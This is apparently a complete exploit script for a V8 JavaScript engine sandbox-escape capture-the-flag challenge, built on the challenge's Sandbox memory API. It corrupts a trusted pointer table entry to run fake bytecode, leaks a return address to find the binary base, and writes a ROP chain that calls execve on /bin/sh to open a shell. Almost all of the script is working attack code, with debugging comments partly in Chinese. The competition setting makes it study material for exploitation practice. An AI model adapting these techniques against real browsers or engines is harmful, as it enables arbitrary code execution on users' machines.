var sbxMemView = new Sandbox.MemoryView(0, 0xfffffff8);
var dv = new DataView(sbxMemView);
function addrOf(o){
    return Sandbox.getAddressOf(o);
}
function readHeap4(offset){
    return dv.getUint32(offset, true);  
}
function readHeap8(offset){
    return dv.getBigUint64(offset, true);
}
function writeHeap1(offset, value){
    dv.setUint8(offset, value, true);
}
function writeHeap4(offset, value){
    dv.setUint32(offset, value, true);
}  
function writeHeap8(offset, value){
    dv.setBigUint64(offset, value, true);   
}

function getH32BinaryAddress(){
    // provided by chal
    return Sandbox.H32BinaryAddress;
}

var i64 = new BigInt64Array(1);
var f64 = new Float64Array(i64.buffer);

// helper functions
function ftoi(x) {
  f64[0] = x;
  return i64[0];
}

function itof(x) {
  i64[0] = x;
  return f64[0];
}

function hex(value){
	return "0x" + value.toString(16);
}

const buf = new ArrayBuffer(0x100);
const u32arr = new Uint32Array(buf);
const u8arr = new Uint8Array(buf);

// %DebugPrint(u32arr);
hex(getH32BinaryAddress())
// console.log("pie: " + hex(getH32BinaryAddress())); // 這行不能亂刪 不然會 crash (Found the reason)
console.log("Sbx base: " + hex(Sandbox.base));


function hax1(a, b) {
    return a + b + 1;
}

hax1(1, 2);

backingStore = Sandbox.base + 0x100000080;
console.log("backing store of ArrayBuffer: "+hex(backingStore));

// %DebugPrint(hax1);
// %SystemBreak();
idx = 0x2003;
kTrustedPointerShift = 9;
target = Number(((0x1bn << 48n) | BigInt(backingStore))+1n); // I hate number conversion in js...
Sandbox.modifyTrustedPointerTable(idx << 9,0,target);

fake_bytecode = [
    0x00000949, 0x00400600, 0x00000012, 0x00194c31,
    0x00000000, 0x00000011, 0x00000019, 0x00000000,
    0x00000003, 0x00000000, 0x033b040b, 0x01014700,
    0x000000af, 0x00000000, 0x00000000, 0x00000000
];
u32arr.set(fake_bytecode);

%DebugPrint(hax1);
%SystemBreak();

// 0b 04             Ldar a1
// 0b is instruction and 04 is the offset of a register(?)
// Ldar a15 (some saved retaddr), a19, a16 also has leak I think?
bytecode_offset = 0x28;
u8arr[bytecode_offset] = 0x0b;
bytecode_offset++;
u8arr[bytecode_offset] = 18; // a15 is correct due to my testing, 其他會有玄學事件
bytecode_offset++;
// Return
u8arr[bytecode_offset] = 0xaf;
bytecode_offset++;
ooo = BigInt(hax1(0,0));
console.log("hax1(0,0): " + ooo);
// %SystemBreak();
leak = ooo << 1n;
if (leak < 0){
    leak = leak + 0x100000000n; // handle negative
}
console.log("leak: " + hex(leak));
pie = BigInt(getH32BinaryAddress()) + leak - 0x252b31cn;
console.log("pie: " + hex(pie));
bin_sh = "/bin/sh";
bin_sh_addr = Sandbox.base + addrOf(bin_sh) + 0xc;
console.log("bin_sh_addr: " + hex(bin_sh_addr));
bytecode_offset = 0x28;
// Ldar a0 (first func arg)
u8arr[bytecode_offset++] = 0x0b;
u8arr[bytecode_offset++] = 0x03;
// Star a-3 (saved RBP)
u8arr[bytecode_offset++] = 0x18;
u8arr[bytecode_offset++] = 0; // 1 is rsp not ok since it only accepts sandboxed pointer, choose 0
// Return
u8arr[bytecode_offset++] = 0xaf;
rop = {};
fake_obj = Sandbox.getObjectAt(addrOf(rop) + 0x100);
writeHeap1(addrOf(rop) + 0x2e1, 0xaf); // 他在 return 時會去再執行一次 machine code, 這裡偽造一個 ret instruction 第二次執行後會跳過
// b *(Builtins_InterpreterEntryTrampoline+295)
// b *(Builtins_JSEntryTrampoline+92)
writeHeap8(addrOf(rop) + 0xe1, BigInt(addrOf(rop) + 0x2e1 + Sandbox.base));
// %DebugPrint(rop);
// %DebugPrint(fake_obj);
pop_rax = pie + 0x11a8972n;
pop_rdi = pie + 0x135f98en;
pop_rsi = pie + 0x1249f8en;
pop_rdx = pie + 0x120cd42n;
syscall = pie + 0x11a9815n;
rop_chain = addrOf(rop) + 0x109;
writeHeap8(rop_chain, pop_rax);
writeHeap8(rop_chain + 8, 59n);
writeHeap8(rop_chain + 16, pop_rdi);
writeHeap8(rop_chain + 24, BigInt(bin_sh_addr));
writeHeap8(rop_chain + 32, pop_rsi);
writeHeap8(rop_chain + 40, 0n);
writeHeap8(rop_chain + 48, pop_rdx);
writeHeap8(rop_chain + 56, 0n);
writeHeap8(rop_chain + 64, syscall);
// %SystemBreak();
//hax1(rop);
hax1(fake_obj);
